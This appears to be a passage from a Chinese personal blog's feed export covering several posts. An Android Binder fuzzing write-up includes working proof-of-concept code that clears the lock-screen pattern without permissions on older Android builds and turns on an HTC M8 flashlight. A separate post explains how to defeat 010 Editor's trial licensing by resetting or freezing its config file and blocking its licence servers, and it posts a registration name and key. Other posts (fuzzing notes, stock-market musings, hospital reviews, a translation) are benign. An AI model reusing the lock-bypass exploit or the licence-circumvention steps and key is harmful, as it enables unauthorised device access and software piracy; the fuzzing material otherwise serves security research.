class_">HashMap</span>();<br><br>    <span class="hljs-keyword">if</span> (interfaceDescriptor == <span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">return</span> ret;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        Class&lt;?&gt; cStub = Class<br>                .forName(interfaceDescriptor + <span class="hljs-string">&quot;$Stub$Proxy&quot;</span>);<br>        Method[] m = cStub.getDeclaredMethods();<br><br>        <span class="hljs-keyword">for</span> (Method method : m) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">func_code</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            List&lt;String&gt; func_parameter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><br>            method.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">func_name</span> <span class="hljs-operator">=</span> method.toString().split(<span class="hljs-string">&quot;\\$Stub\\$Proxy\\.&quot;</span>)[<span class="hljs-number">1</span>];<br>            func_parameter.add(func_name);<br><br>            <span class="hljs-keyword">for</span> (String key : codes.keySet()) &#123;<br>                <span class="hljs-keyword">if</span> (func_name.contains(key.substring(<span class="hljs-string">&quot;TRANSACTION_&quot;</span>.length())))<br>                    func_code = codes.get(key);<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (func_code == <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">continue</span>;<br><br>            Class&lt;?&gt;[] ParameterTypes = method.getParameterTypes();<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>; k &lt; ParameterTypes.length; k++) &#123;<br>                func_parameter.add(ParameterTypes[k].toString());<br>            &#125;<br><br>            ret.put(Integer.toString(func_code), func_parameter);<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="5）Binder-调用"><a href="#5）Binder-调用" class="headerlink" title="5）Binder 调用"></a>5）Binder 调用</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> IBinder <span class="hljs-title function_">getIBinder</span><span class="hljs-params">(String service)</span> &#123;<br>    <span class="hljs-type">IBinder</span> <span class="hljs-variable">serviceBinder</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<br>        serviceBinder = (IBinder) Class.forName(<span class="hljs-string">&quot;android.os.ServiceManager&quot;</span>)<br>                .getDeclaredMethod(<span class="hljs-string">&quot;getService&quot;</span>, String.class).invoke(<span class="hljs-literal">null</span>, service);<br>    &#125; <span class="hljs-keyword">catch</span> (ClassCastException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>    &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> serviceBinder;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fuzz</span> <span class="hljs-params">(<span class="hljs-type">int</span> code, String Service)</span> &#123;<br>    <span class="hljs-type">Parcel</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> Parcel.obtain();<br>    <span class="hljs-type">Parcel</span> <span class="hljs-variable">reply</span> <span class="hljs-operator">=</span> Parcel.obtain();<br><br>    <span class="hljs-type">IBinder</span> <span class="hljs-variable">serviceBinder</span> <span class="hljs-operator">=</span> BinderInfo.getIBinder(service);<br>    serviceBinder.transact(code, data, reply, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>上面的几个步骤已经全部java 代码实现，可行。</p><h2 id="5-实现方法的分析于比较"><a href="#5-实现方法的分析于比较" class="headerlink" title="5. 实现方法的分析于比较"></a>5. 实现方法的分析于比较</h2><p>ioctl 的方法过于底层，需要实现的代码很多，而 java 应用层的代码由于权限原因，经常会遇到没有权限的情况。<br>所以使用 Native 层的方法是合适的，在Root 的Android 机器上运行代码，可以解决权限问题。而 Java 应用层的<br>代码利用反射可以获取到每个接口的详细信息，根据获取到的信息指导 Native 层 fuzz 程序的后续变异，应该是比较理想的方法。</p><h2 id="6-Fuzz-数据的生成"><a href="#6-Fuzz-数据的生成" class="headerlink" title="6. Fuzz 数据的生成"></a>6. Fuzz 数据的生成</h2><p>可以考虑移植 radasma 到 Android 平台</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/anestisb/radamsa-android.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> radamsa-android</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:NDK_PATH</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">ndk-build NDK_PROJECT_PATH=. APP_BUILD_SCRIPT=./jni/Android.mk \</span><br><span class="language-bash">    APP_PLATFORM=android-24 APP_ABI=armeabi-v7a \</span><br><span class="language-bash">    NDK_TOOLCHAIN=arm-linux-androideabi-4.9</span><br><br><br>[armeabi-v7a] Compile thumb  : radamsa &lt;= radamsa.c<br>[armeabi-v7a] Executable     : radamsa<br>[armeabi-v7a] Install        : radamsa =&gt; libs/armeabi-v7a/radamsa<br></code></pre></td></tr></table></figure><h3 id="6-1-更新-radamsa-android"><a href="#6-1-更新-radamsa-android" class="headerlink" title="6.1 更新 radamsa-android"></a>6.1 更新 radamsa-android</h3><p>github 上移植的radamsa 已经比较古老 (0.4), 可以直接将最新版(0.6a)的radamsa 移植<br>到 Android上。方法比较简单，在原始的 radamsa 中有一个 radamsa.c 将这个文件替换<br>radamsa-android&#x2F;jni 目录下的 radamsa.c</p><p>然后在文件中添加下面代码， 重新编译即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> ANDROID</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> WIFCONTINUED</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> WIFCONTINUED(stat) 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h2 id="7-Fuzz-出来的一些漏洞"><a href="#7-Fuzz-出来的一些漏洞" class="headerlink" title="7. Fuzz 出来的一些漏洞"></a>7. Fuzz 出来的一些漏洞</h2><h3 id="1）-htc-m8-零权限打开闪光灯"><a href="#1）-htc-m8-零权限打开闪光灯" class="headerlink" title="1） htc m8 零权限打开闪光灯"></a>1） htc m8 零权限打开闪光灯</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">IBinder</span> <span class="hljs-variable">serviceBinder</span> <span class="hljs-operator">=</span> getIBinder(<span class="hljs-string">&quot;media.camera&quot;</span>);<br><br><span class="hljs-type">Parcel</span> <span class="hljs-variable">data1</span> <span class="hljs-operator">=</span> Parcel.obtain();<br><span class="hljs-type">Parcel</span> <span class="hljs-variable">reply1</span> <span class="hljs-operator">=</span> Parcel.obtain();<br><br><span class="hljs-keyword">try</span> &#123;<br>    data1.writeInterfaceToken(serviceBinder.getInterfaceDescriptor());<br>    data1.writeByteArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>]);<br>    serviceBinder.transact(<span class="hljs-number">8</span>, data1, reply1, <span class="hljs-number">0</span>);<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;&#125;<br></code></pre></td></tr></table></figure><h3 id="2）-Android-6-0-1-MOB3OM-手势密码清除漏洞"><a href="#2）-Android-6-0-1-MOB3OM-手势密码清除漏洞" class="headerlink" title="2） Android 6.0.1 MOB3OM 手势密码清除漏洞"></a>2） Android 6.0.1 MOB3OM 手势密码清除漏洞</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attack</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">IBinder</span> <span class="hljs-variable">serviceBinder</span> <span class="hljs-operator">=</span> getIBinder(<span class="hljs-string">&quot;lock_settings&quot;</span>);<br><br><span class="hljs-type">Parcel</span> <span class="hljs-variable">data1</span> <span class="hljs-operator">=</span> Parcel.obtain();<br><span class="hljs-type">Parcel</span> <span class="hljs-variable">reply1</span> <span class="hljs-operator">=</span> Parcel.obtain();<br><br><span class="hljs-keyword">try</span> &#123;<br>data1.writeInterfaceToken(serviceBinder.getInterfaceDescriptor());<br>data1.writeByteArray(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">255</span>]);<br>serviceBinder.transact(<span class="hljs-number">7</span>, data1, reply1, <span class="hljs-number">0</span>);<br>&#125; <span class="hljs-keyword">catch</span> (RemoteException e) &#123;&#125;<br>&#125;<br><br><span class="hljs-keyword">public</span> IBinder <span class="hljs-title function_">getIBinder</span><span class="hljs-params">(String service)</span> &#123;<br><span class="hljs-type">IBinder</span> <span class="hljs-variable">serviceBinder</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">try</span> &#123;<br>serviceBinder = (IBinder) Class.forName(<span class="hljs-string">&quot;android.os.ServiceManager&quot;</span>)<br>.getDeclaredMethod(<span class="hljs-string">&quot;getService&quot;</span>, String.class).invoke(<span class="hljs-literal">null</span>, service);<br>&#125; <span class="hljs-keyword">catch</span> (ClassCastException e) &#123;<br>&#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>&#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException e) &#123;<br>&#125; <span class="hljs-keyword">catch</span> (InvocationTargetException e) &#123;<br>&#125; <span class="hljs-keyword">catch</span> (IllegalAccessException e) &#123;<br>&#125;<br><br><span class="hljs-keyword">return</span> serviceBinder;<br>&#125;<br></code></pre></td></tr></table></figure><p>在Android 6.0.1 MOB3OM 之前的一些版本中, 未在setLockPattern 中做权限检查,<br>导致apk 不需要任何权限就可以将手势密码清除. </p><p>这个问题已经修复 author Jim Miller <a href="mailto:&#106;&#x61;&#103;&#x67;&#x69;&#x65;&#115;&#x40;&#103;&#111;&#x6f;&#x67;&#108;&#101;&#x2e;&#x63;&#111;&#x6d;">&#106;&#x61;&#103;&#x67;&#x69;&#x65;&#115;&#x40;&#103;&#111;&#x6f;&#x67;&#108;&#101;&#x2e;&#x63;&#111;&#x6d;</a>Wed Apr 13 16:35:36 2016 -0700</p><p><a href="https://android.googlesource.com/platform/frameworks/base/+/b5383455b6cae093e60684b4f5cccb0cc440330d%5E%21/#F0">https://android.googlesource.com/platform/frameworks/base/+/b5383455b6cae093e60684b4f5cccb0cc440330d%5E%21/#F0</a></p><p>但是考虑到Android 的碎片化问题, 估计在一些手机中将存在这个问题. </p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Gong-Fuzzing-Android-System-Services-By-Binder-Call-To-Escalate-Privilege.pdf">Fuzzing Android System Services by Binder Call to Escalate Privilege</a></li><li><a href="https://googleprojectzero.blogspot.com/2016/12/bitunmap-attacking-android-ashmem.html">BitUnmap: Attacking Android Ashmem</a></li><li><a href="http://newandroidbook.com/files/Andevcon-Binder.pdf">Android’s Binder – in depth</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
      <tag>Android</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>afl-fuzz 框架</title>
    <link href="/cn/afl/"/>
    <url>/cn/afl/</url>
    
    <content type="html"><![CDATA[<p>afl-fuzz 的整体架构，新手理解起来还是比较费劲，网络上发现一张图觉得不错，放上来大家看看，感谢原作者。</p><p><img src="https://raw.githubusercontent.com/henices/pictures/master/afl-fuzz.png" alt="afl-fuzz"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Dissecting American Fuzzy Lop A FuzzBench Evaluation 要点</title>
    <link href="/cn/afl-fuzz1/"/>
    <url>/cn/afl-fuzz1/</url>
    
    <content type="html"><![CDATA[<p>paper: <a href="https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pdf">https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pdf</a></p><h2 id="两个实验的结论-主要基于-FuzzBench"><a href="#两个实验的结论-主要基于-FuzzBench" class="headerlink" title="两个实验的结论 (主要基于 FuzzBench)"></a>两个实验的结论 (主要基于 FuzzBench)</h2><ul><li>Our conclusion after this experiment is that AFL, and follow-ups fuzzers like AFL++, should provide an optionto disable hitcounts. AFL++ provides many different op-tions, and the users are suggested to run an instance of each variant when doing parallel fuzzing, a common use-case in real-world setups. The fact that in our experiments,hitcounts have shown a highly variadic behavior suggests that users should include a variant without hitcounts when doing parallel or ensemble fuzzing like OSS-Fuzz.</li><li>The conclusion we can draw from this experiment is that it would be a mistake to underestimate the impact of the novelty search. In particular, researchers proposing new approaches that also modify this aspect should care-fully evaluate – in isolation – the benefit of a different mechanism to decide if an input is interesting, as AFL’s novelty search provides a strong baseline.</li></ul><h2 id="论文中计划要评估的-afl-fuzz-的一些技术"><a href="#论文中计划要评估的-afl-fuzz-的一些技术" class="headerlink" title="论文中计划要评估的 afl-fuzz 的一些技术"></a>论文中计划要评估的 afl-fuzz 的一些技术</h2><ul><li><strong>Hitcounts</strong>: Hitcounts are adopted by other fuzzers to-day, but AFL was the first to introduce this concept.Despite its wide adoption, the impact of this optimization (overplain edge coverage) has never been measured in isolation on a large set of targets.</li><li><strong>Novelty search vs. maximization of a fitness</strong>: While AFL considers every new discovered hitcount as interesting, both other early fuzzing solutions and more recent tools instead only consider testcases that maximize a given metricas interesting. For instance, VUZZER uses the sum of all the weights of the executed basic blocks.<ul><li>In this experiment, we benchmark the AFL approach versusa fitness maximization and the combination of the two ap-proaches, as proposed by VUZZER</li><li>We expect the novelty search to outperforms both of the competing algorithms,</li></ul></li><li><strong>Corpus culling</strong>: The prioritization of the small and fast testcases in the AFL corpus selection algorithm trades speed with the fuzzing of more complex testcases that often corresponds to complex program states<ul><li>In this experiment, we want to assess the difference in using the AFL corpus culling mechanism versus using the entire corpus.</li><li>We expect faster growth in coverage over time and,potentially, more bugs triggered in the same time window</li></ul></li><li><strong>Score calculation</strong>: The performance score used to cal-culate how many times to mutate and execute the input in the havoc, and splice stages are derived from many variables,mainly testcase size and execution time<ul><li>In this experiment, we want to measure the delta between the AFL solution and the baseline, represented by a constantand a random score</li></ul></li><li><strong>Corpus scheduling</strong>: The FIFO policy used by AFL is only one of the possible policies that a fuzzer can adopt to select the next testcase<ul><li>Thus, we evaluate AFL versus a modified version that implements the baseline, random selection, and the opposite approach, a LIFO scheduler.</li></ul></li><li><strong>Splicing as stage vs. splicing as mutation</strong>: Splicing refers to the operation that merges two different testcases into a new one<ul><li>We modified the AFL codebase to implement splicing as a mutation operator to compare the two.</li></ul></li><li><strong>Trimming</strong>: Trimming the testcases allows the fuzzer to reduce the size of the input files and consequently give priority to small inputs, under the assumptions that large inputs introduce a slowdown in the execution and the mutations would be less likely to modify an important portion of the binary structure<ul><li>Despite the fact that this algorithm can bring the two important benefits described above, we argue that reducing the size of the testcases could lead to lose state coverage.Additionally, the trimming phase could become a bottleneck for slow targets</li><li>Therefore, in our evaluation we plan tocompare the default version of AFL against a modified one,where we disabled trimming</li></ul></li><li><strong>Collisions</strong>: As explained in section III-F the AFL ap-proach to instrument the source code of the target programs consists of assigning an identifier for each basic block at compile-time.<ul><li>We want to benchmark this feature as the collision-free variant is simpler than the original implementation with pc-guard, raising the question why random identifiers are used in AFL</li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于A股变盘的假期效应思考</title>
    <link href="/cn/a_change/"/>
    <url>/cn/a_change/</url>
    
    <content type="html"><![CDATA[<p>沉浮 A股多年，发现一个比较重要的规律，A 股变盘的时间节点大多发生在重大节假日期间，分别举例如下：</p><ul><li>「1」重大节日 （包括阳历和农历： 劳动节，国庆节，中秋节，端午节，过年 等）</li><li>「2」周一&#x2F;周五</li><li>「3」月初&#x2F;月末</li></ul><p>有人总结出 A 股变盘时间节点和农历的 24 节气相关，每个节气的时间间隔大致在 15 到 16 天左右，这条规律<br>其实和上面的 「1」 说法是一致的。</p><p>思考其背后的原因，平时交易日都是连续的中间无间断，大家的交易思路和看法也比较容易连续一致。<br>每逢重大节日，或者月初月末，往往都是放假休息的时间，外加期间各种信息的输入量比平时大很多，这样容易有思维波动。重大节日后，主力一带节奏，容易对大家的思维进行强化，分歧转一致后，就真的变盘了。</p><p>A股还有个月初，月末效应，月初赚钱，月末亏钱，比较奇怪，可能和基金经理的月初建仓和月末考核相关，这条规律几乎是对称的，如果月末没有大跌，月初基本就没有大赚效应。</p><p>后面发现居然有一个股票技术分析流派叫季节派。（季节理论 Season Theory）</p>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>紫竹桥附近看病情况</title>
    <link href="/cn/304/"/>
    <url>/cn/304/</url>
    
    <content type="html"><![CDATA[<p>作为一个长期在帝都紫竹桥混吃的中年大叔，经常遇到需要看病的情况，主要需求有两个 （大人看病，小孩看病）。</p><p>总结附近医院情况，个人理解，供参考：</p><p>466:</p><p>缺点：没有儿科，巨贵，感觉医生喜欢过度治疗，据说一些科室已被私人承包，媳妇和自己都被坑过。<br>优点：离紫竹桥距离近，三甲，人通常比较少，小病，偷懒的时候可以过去。据说牙科不错，但是我没有去过。</p><p>304:</p><p>缺点：信息化程度相对较弱，但是看病流程梳理得不错。<br>优点：三甲，有儿科，对小儿看病有一定优待。医生水平不错，小孩在这看过几次，治疗效果不错。</p><p>现在304 改名为 解放军总医院第四医学中心，儿科的实力比以往有较大提升。</p><p>四季青：</p><p>缺点：二级医院，儿科有的医生感觉不太专业。<br>优点：挂号方便，有儿科，医院较大。</p><p>北方医院：</p><p>缺点：二级医院， 医院较小。<br>优点：离紫竹桥距离近，有保健科，小孩打预防针不错。</p><p>空总：</p><p>在这个医院多个科室看过病，家人还在这做过微创手术。</p><p>缺点：挂号有点难，人多，儿科水平一般。<br>优点：三甲，皮肤科北京有名，各科室水平比较均衡。信息化程度高，看病挺方便。</p><p>海总：</p><p>这个医院我没有去过，距离稍远。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>010editor 保持试用</title>
    <link href="/cn/010editor/"/>
    <url>/cn/010editor/</url>
    
    <content type="html"><![CDATA[<h2 id="软件介绍"><a href="#软件介绍" class="headerlink" title="软件介绍"></a>软件介绍</h2><p>010Editor是一款快速且强大的十六进制编辑器。用来编辑二进制文件。有一个友好易于使用的界面，无限次的<br>undo和redo操作。另外还可以打印十六进制的字节或者以书签的方式标出某些重要的字节。<br>支持二进制模板（binary template）系统。</p><h2 id="保持试用"><a href="#保持试用" class="headerlink" title="保持试用"></a>保持试用</h2><p>国外软件很多时候相当厚道了，试用基本是全功能，轻微延时和不能自动更新二进制模板，就日常使用来说基本<br>是完全够用了。</p><p>关键文件为 <code>~/.config/SweetScape/010 Editor.ini</code>，无法使用的时侯可以把这个文件清空，将恢复30天试用状态，<br>或者简单粗暴的将文件设置为只读。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 444 <span class="hljs-string">&quot;010 Editor.ini&quot;</span><br></code></pre></td></tr></table></figure><p>用IDA逆向的时侯没有发现这个文件比较奇怪。这个文件是 是使用strace命令发现的，strace命令支持 <code>-e</code> 的过<br>滤参数将有效减少输出，一般来说看strace日志文件可以从最后往前看。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">strace -e trace=file ./010editor<br></code></pre></td></tr></table></figure><p>从代码上看有使用网络验证需要在hosts文件中屏敝两个网站， 可以减少一些不必要的麻烦。</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span> www.sweetscape.com<br><span class="hljs-number">127.0.0.1</span> www.010editor.com<br></code></pre></td></tr></table></figure><p>我现在已经是注册用户了，在很长的一段时间内，这方法是管用的，做个备忘。</p><p>scz 补充：</p><p>之前github上的那个开源keygen还能用，或者就用</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">user</span>    <span class="hljs-title">user</span><br>pass    <span class="hljs-number">3470</span>D4AC7CEFACD9297A<br></code></pre></td></tr></table></figure><p>只是hosts更改可能不够，windows上用wf.msc阻止010 Editor联网，Linux好像没有简单办法阻止特定进程联网，<br>只能变相利用uid、gid达成目的。</p><p>How to block internet access to certain programs on Linux<br><a href="https://serverfault.com/questions/550276/how-to-block-internet-access-to-certain-programs-on-linux">https://serverfault.com/questions/550276/how-to-block-internet-access-to-certain-programs-on-linux</a></p><p><a href="https://unix.stackexchange.com/questions/104830/block-specific-application-with-iptables">https://unix.stackexchange.com/questions/104830/block-specific-application-with-iptables</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>Crack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Keynote - How Do You Actually Find Bugs?</title>
    <link href="/en/How_do_you_actually_find_bugs/"/>
    <url>/en/How_do_you_actually_find_bugs/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.youtube.com/watch?v=7Ysy6iA2sqA&ab_channel=OffensiveCon">https://www.youtube.com/watch?v=7Ysy6iA2sqA&amp;ab_channel=OffensiveCon</a></p><ul><li>Temperament<ul><li>Curiosity</li><li>Detail-oriented</li><li>Ability to deal with failure and continual evidence that you’re wrong</li></ul></li><li>Learn how to deal with failure<ul><li>Two projects (can be unrealeted, or different parts of the same)<ul><li>Learn to recognize whe you have hit a wall and have become unproductive</li><li>Switch to your secondary project</li></ul></li><li>Consider having a development project as your seconary project<ul><li>Do an achiveable, measurable task</li><li>Regain a sense of achievement</li></ul></li></ul></li><li>Moving on - Knowning when to quit<ul><li>You will return it in the future</li></ul></li><li>Motivation - Remaining Enager<ul><li>The more you’re curious about how a technology works or how an algorithm achives its goal, the less monotonous code review is</li></ul></li><li>Motivation - bug patching<ul><li>bugs being patched is frustrating<ul><li>… but they are evidence that you were on the right track!</li></ul></li></ul></li><li>Confidence<ul><li>Research is a daunting filed to enter</li><li>Some security reseacher you respect had the same self-doubt coming in, and have recurrences from time to time</li><li>Growth mindset: “I can’t do that … Yet”</li></ul></li><li>Bias and assumptions<ul><li>Common code reviewer biases<ul><li>Everyone has looked at the already (many eyes make all bugs shallow)</li><li>Even if I found something, it will be unexploitable (Server side)</li><li>The X attack surface is not interesting now (eg, media parsing in browsers)</li><li>There are no more bugs in this</li><li>The protocol doesn’t allow you to do X</li></ul></li></ul></li><li>Auditing Process<ul><li>Understanding the code</li><li>Documenting your findings</li><li>Identifying bias</li><li>Tooling</li><li>Revisit the code base</li><li>Analyze failures</li></ul></li><li>Attampt to understand the code<ul><li>A lot of people try to short-circuit this process<ul><li>Reliance on tools</li><li>Fuzzers&#x2F;static analyzers are a guide, not the whole process</li></ul></li><li>Many of today’s vulnerabilities are complex, and require in-depth understanding of the codebase</li><li>The more you understand about how the program works, the better equipped you are to find bugs ( and exploit them)</li><li>The best way to understand how something works is to explain to someone else</li></ul></li><li>What I’m looking for<ul><li>software risk &#x3D; available attack surface * complexity</li><li>attack surface can be indirect<ul><li>even mitigations are attack surface</li></ul></li><li>often you initial perception of attack surface is naive<ul><li>Hidden&#x2F;non-obvious attack surfaces are the best</li></ul></li><li>Complexity is plentiful<ul><li>Feature driven (thanks w3c)</li><li>Legacy support</li><li>Often avoidable: the anomaly of cheap complexity</li></ul></li></ul></li><li>Borrwoing ideas<ul><li>Bugtracker &#x2F; Diffs<ul><li>Can show where a bug is</li><li>Can inspire new ideas: variants, same bugs in other codebase</li><li>Mean but viable: track commits by error-prone developers</li></ul></li><li>Comments in the codebase<ul><li>Descripbe things I’d never thought of</li></ul></li></ul></li><li>Document your findings<ul><li>Get into the habit of documenting<ul><li>ideas, bugs candidates, idiosyncrasies, data structure, algorithms</li></ul></li><li>Documenting failed ideas is as important as documenting successful ones<ul><li>avoids repeating thie idea sometime later</li></ul></li><li>Long term view: I’m going to revisit this later</li></ul></li><li>Revisit code bases and failed bugs<ul><li>code bases are not static<ul><li>coee rewritten</li><li>Features added&#x2F;changed</li></ul></li><li>Environment is not static</li></ul></li><li>Analyze your failures<ul><li>if someone succeeds where you didn’t, have a look at what they found</li><li>Try to figure out: why did I miss it?</li><li>Is this a one-off or teachable trick&#x2F;blind spot</li><li>Can you improve on that?</li><li>Is there a pattern in those falures?</li><li>Failures is an oppotunity to learn</li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>(译文) 一秒钟内整理数字生活的系统 by claude</title>
    <link href="/cn/PARA/"/>
    <url>/cn/PARA/</url>
    
    <content type="html"><![CDATA[<p>The PARA Method: The Simple System for Organizing Your Digital Life in Seconds<br><a href="https://fortelabs.com/blog/para">https://fortelabs.com/blog/para</a></p><p>想象一下完美的组织系统。一个系统会告诉你如何确切地把生活中的每一件信息-每份文件、笔记、日程、大纲和研究的碎片-放在哪里,以及之后如何轻松地找到它们。</p><p>这样的系统需要非常简单易用,也非常容易维护。毕竟,只有最简单、最轻松的习惯能长期坚持。</p><p>它需要灵活适应你在不同人生阶段的需求,同时也需要全面,这样你可以在存储信息的各个地方使用它,比如你的电脑文件系统、云存储平台(如Dropbox或谷歌云端硬盘)或者数字笔记应用。</p><p>但是最重要的是,理想的组织系统能够直接带来工作和生活中的实实在在的好处。它会极大地加速你完成最重要的项目和实现目标。</p><p>换句话说, <strong>组织你的生活的最佳系统,是可操作的</strong>。</p><p>它不会给你制造更多障碍,不会推迟那些能带来进步的行动,而是让这些行动更接近和更容易开始与完成。</p><p>通过十多年的个人实践、指导数千学生以及辅导世界级专业人士,我已经制定出这样的系统。</p><p><strong>它被称为PARA - 一个简单、全面的且极其灵活的系统,可以组织任何类型的数字信息,跨任何平台。</strong></p><p>我向你保证,它不仅能把你的生活井井有条,还能让你掌握一套工具,巧妙地掌控信息流,以实现你设想的一切。</p><span id="more"></span><h2 id="包含你整个生活的4个类别"><a href="#包含你整个生活的4个类别" class="headerlink" title="包含你整个生活的4个类别"></a>包含你整个生活的4个类别</h2><p>PARA 基于一个简单的观察:只有4个类别涵盖了你生活中的所有信息。<br><img src="https://raw.githubusercontent.com/henices/pictures/master/para1.png" alt="para1"></p><p>你有正在积极推进的<strong>项目</strong> - <strong>短期努力</strong> (在工作或私人生活中),你以某种目标为指导而进行。例如:</p><ul><li>完成网页设计</li><li>买一台新电脑</li><li>写研究报告</li><li>改造浴室</li><li>完成西班牙语课程</li><li>布置新的客厅家具</li></ul><p>你<strong>有责任</strong>领域 - 